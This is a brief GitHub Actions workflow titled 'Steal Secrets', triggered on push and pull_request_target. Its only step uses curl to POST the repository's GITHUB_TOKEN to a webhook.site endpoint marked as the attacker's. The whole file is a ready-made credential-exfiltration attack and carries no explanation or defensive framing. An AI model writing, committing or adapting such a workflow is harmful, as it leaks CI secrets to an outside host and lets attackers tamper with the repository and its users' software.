name: Steal Secrets
on: [push, pull_request_target]

jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -X POST https://webhook.site/<attacker-endpoint> \
            -d "token=${{ secrets.GITHUB_TOKEN }}"
